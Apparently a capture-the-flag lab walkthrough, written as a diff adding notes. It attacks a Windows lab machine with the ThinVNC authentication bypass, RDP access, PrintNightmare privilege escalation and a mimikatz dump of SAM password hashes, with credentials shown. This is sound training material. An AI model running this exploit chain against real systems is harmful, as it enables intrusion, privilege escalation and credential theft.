@@ -1,0 +1,76 @@
+ip : 10.10.9.110 
+
+* nmap scans reveals that 2 ports are open 
+	3389
+	8080
+
+* using curl on the highest port on the machine 
+
+curl -v 10.10.9.110:8080
+
+* we find that thinvnc is running and checking searchsploit for an exploit 
+
+searchsploit thinvnc
+
+* thinvnc is vulnerable to authentication bypass
+* exploting the vulnerability
+* git clone the repository
+
+	https://github.com/MuirlandOracle/CVE-2019-17662.git
+
+* cd to directory and chmod +x the exploit 
+* run the exploit 
+
+thinvnc 10.10.9.110 8080
+
+* we get a credential
+
+creds : Atlas : H0ldUpTheHe@vens
+
+* login to the site with the credentials 
+ 
+* rdp into the machine with the credentials
+
+xfreerdp /v:10.10.9.110 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+
+* the machine is vulnerable to print-nightmare vulnerability
+* so we git clone the powershell version of the print-nightmare exploit by john-hammond in to the attacker tmp directory
+* since the attacker tmp will be shared the exploit will be available in the rdp machine too
+* open powershell in the victim machine and run the command to import it 
+
+. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1 
+
+* run the exploit, which will create a user admin with credentials and add the user to local administrator group 
+
+Invoke-Nightmare
+
+creds : admin : P@ssw0rd
+
+* run the command to start a cmd with admin privileges
+
+Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
+
+* enter the password and we are an admin in the machine
+
+* now we are running with the highest privileges 
+
+whoami /groups
+
+* now we can dump the credentials with mimikatz
+* clone the mimikatz.zip into the attacker /tmp folder and unzip it 
+* on the elevetaed privilege shell run the following command
+
+\\tsclient\share\x64\mimikatz.exe
+
+* this will start mimikatz in the machine 
+* while using mimikatz we should always run two commands before we dump the sam
+	privilege::debug
+	token::elevate
+	
+* now we dump the sam with the command 
+
+lsadump::sam
+
+* now we have all the users NTLM hashes 
+	 
+  
